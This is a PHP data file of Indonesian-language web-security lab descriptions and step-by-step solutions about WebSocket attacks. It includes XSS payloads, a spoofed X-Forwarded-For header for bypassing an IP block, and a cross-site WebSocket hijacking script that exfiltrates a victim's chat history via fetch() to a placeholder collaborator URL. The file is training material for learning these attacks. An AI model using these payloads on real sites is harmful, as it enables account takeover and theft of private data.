<?php

return [
    'dddcbacfe04eccc56d7fbf70f27dd50a1732bc533a5f5237a067a80651ef4bab' => [
        'title' => 'Memanipulasi pesan WebSocket untuk mengeksploitasi kerentanan',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Toko online ini memiliki fitur live chat yang diimplementasikan menggunakan WebSockets.
        </p><p>
            Pesan chat yang Anda kirim dilihat secara real-time oleh agen dukungan.
        </p><p>
            Untuk menyelesaikan lab ini, gunakan pesan WebSocket untuk memicu popup <code>alert()</code> di browser agen dukungan.
        </p>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Klik "Live chat" lalu kirim sebuah pesan chat.
                    </li>
                    <li>
                        Di Burp Proxy, buka tab WebSockets history, dan amati bahwa pesan chat dikirim melalui pesan WebSocket.
                    </li>
                    <li>
                        Menggunakan browser, kirim pesan baru yang mengandung karakter <code>&lt;</code>.
                    </li>
                    <li>
                        Di Burp Proxy, temukan pesan WebSocket yang bersesuaian dan perhatikan bahwa karakter <code>&lt;</code> telah di-encode sebagai HTML oleh klien sebelum dikirim.
                    </li>
                    <li>
                        Pastikan Burp Proxy dikonfigurasi untuk mencegat pesan WebSocket, lalu kirim satu pesan chat lagi.
                    </li>
                    <li>
                        <p>
                            Ubah pesan yang dicegat agar memuat payload berikut:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror='alert(1)'&gt;</code>
                    </li>
                    <li>
                        Amati bahwa alert muncul di browser. Hal yang sama akan terjadi di browser agen dukungan.
                    </li>
				</ol>
            </div></div>
LABHTML,
        ],
    ],
    'a15ec3915bdc09700eea6c9fd20970de0aaf2bfbb87b3e7ec3d8d9800b8e542d' => [
        'title' => 'Cross-site WebSocket hijacking (CSWSH)',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Toko online ini memiliki fitur live chat yang diimplementasikan menggunakan WebSockets.
        </p><p>
            Untuk menyelesaikan lab ini, gunakan exploit server untuk menghosting payload HTML/JavaScript yang memanfaatkan <a href="/web-security/websockets/cross-site-websocket-hijacking">serangan cross-site WebSocket hijacking</a> guna mengeksfiltrasi riwayat chat korban, lalu gunakan informasi tersebut untuk mengakses akunnya.
        </p><div class="highlightedarea">
            <h4>Catatan</h4>
            <p>
                Untuk mencegah platform Academy dipakai menyerang pihak ketiga, firewall kami memblokir interaksi dari lab ke sistem eksternal sembarangan. Untuk menyelesaikan lab ini, Anda harus memakai exploit server yang disediakan dan/atau server publik bawaan Burp Collaborator.
            </p>
        </div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Klik "Live chat" lalu kirim sebuah pesan chat.
                    </li>
                    <li>
                        Muat ulang halaman.
                    </li>
                    <li>
                        Di Burp Proxy pada tab WebSockets history, amati bahwa perintah "READY" mengambil pesan chat sebelumnya dari server.
                    </li>
                    <li>
                        Di Burp Proxy pada tab HTTP history, temukan permintaan handshake WebSocket. Amati bahwa permintaan tersebut tidak memiliki token CSRF.
                    </li>
                    <li>
                        Klik kanan pada permintaan handshake lalu pilih "Copy URL".
                    </li>
                    <li>
                        <p>
                            Di browser, buka exploit server dan tempelkan template berikut ke bagian "Body":
                        </p>
                        <code class="code-scrollable">&lt;script&gt;
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
&lt;/script&gt;</code>
                    </li>
                    <li>
                        Ganti <code>your-websocket-url</code> dengan URL dari handshake WebSocket (<code>YOUR-LAB-ID.web-security-academy.net/chat</code>). Pastikan protokol diubah dari <code>https://</code> menjadi <code>wss://</code>. Ganti <code>your-collaborator-url</code> dengan payload yang dibuat oleh <a href="/burp/documentation/desktop/tools/collaborator">Burp Collaborator</a>.
                    </li>
                    <li>
                        Klik "View exploit".
                    </li>
                    <li>
                        Lakukan polling interaksi di tab Collaborator. Pastikan serangan berhasil mengambil riwayat chat Anda dan mengeksfiltrasikannya lewat Burp Collaborator. Untuk setiap pesan dalam chat, Burp Collaborator menerima permintaan HTTP yang body-nya berisi isi pesan dalam format JSON. Urutan pesan bisa saja tidak beraturan.
                    </li>
                    <li>
                        Kembali ke exploit server dan kirim eksploit ke korban.
                    </li>
                    <li>
                        Lakukan polling di tab Collaborator lagi. Amati adanya interaksi HTTP tambahan yang berisi riwayat chat korban. Periksa pesan-pesannya dan temukan pesan yang memuat username dan password korban.
                    </li>
                    <li>
                        Gunakan kredensial tersebut untuk masuk ke akun korban.
                    </li>
		        </ol>
            </div></div>
LABHTML,
        ],
    ],
    'f745f6c86fd28635cf5bdc4071bcbbd639d2ce9755d8ab435c059fb2c96e90f4' => [
        'title' => 'Memanipulasi handshake WebSocket untuk mengeksploitasi kerentanan',
        'descriptionHtml' => <<<'LABHTML'
<p>
            Toko online ini memiliki fitur live chat yang diimplementasikan menggunakan WebSockets.
        </p><p>
            Fitur ini menerapkan filter XSS yang agresif tetapi memiliki celah.
        </p><p>
            Untuk menyelesaikan lab ini, gunakan pesan WebSocket guna memicu popup <code>alert()</code> di browser agen dukungan.
        </p><div class="component-solution expandable-container">
            
            
		<details><summary><h4><span class="icon-erlenmeyer"></span> Petunjuk</h4></summary><div class="content"><div>
                <ul>
                    <li>
                        Jika Anda kesulitan melewati filter XSS, coba kerjakan <a href="/web-security/cross-site-scripting">lab XSS</a> kami.
                    </li>
                    <li>
                        Terkadang Anda dapat melewati pembatasan berbasis IP dengan memakai header HTTP seperti <code>X-Forwarded-For</code>.
                    </li>
                </ul>
            </div></div></details></div>
LABHTML,
        'sections' => [
            0 => <<<'LABHTML'
<div class="content"><div>
                <ul>
                    <li>
                        Jika Anda kesulitan melewati filter XSS, coba kerjakan <a href="/web-security/cross-site-scripting">lab XSS</a> kami.
                    </li>
                    <li>
                        Terkadang Anda dapat melewati pembatasan berbasis IP dengan memakai header HTTP seperti <code>X-Forwarded-For</code>.
                    </li>
                </ul>
            </div></div>
LABHTML,
            1 => <<<'LABHTML'
<div class="content"><div>
                <ol>
                    <li>
                        Klik "Live chat" lalu kirim sebuah pesan chat.
                    </li>
                    <li>
                        Di Burp Proxy, buka tab WebSockets history, dan amati bahwa pesan chat dikirim lewat pesan WebSocket.
                    </li>
                    <li>
                        Klik kanan pada pesan tersebut lalu pilih "Send to Repeater".
                    </li>
                    <li>
                        <p>
                            Edit dan kirim ulang pesan dengan payload XSS dasar, misalnya:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 onerror='alert(1)'&gt;</code>
                    </li>
                    <li>
                        Amati bahwa serangan diblokir dan koneksi WebSocket Anda dihentikan.
                    </li>
                    <li>
                        Klik "Reconnect", lalu amati bahwa upaya menyambung ulang gagal karena alamat IP Anda telah diblokir.
                    </li>
                    <li>
                        <p>
                            Tambahkan header berikut pada permintaan handshake untuk memalsukan alamat IP Anda:
                        </p>
                        <code class="code-scrollable">X-Forwarded-For: 1.1.1.1</code>
                    </li>
                    <li>
                        Klik "Connect" untuk menyambungkan ulang WebSocket dengan sukses.
                    </li>
                    <li>
                        <p>
                            Kirim pesan WebSocket yang berisi payload XSS terobfuskasi, misalnya:
                        </p>
                        <code class="code-scrollable">&lt;img src=1 oNeRrOr=alert`1`&gt;</code>
                    </li>
                </ol>
            </div></div>
LABHTML,
        ],
    ],
];
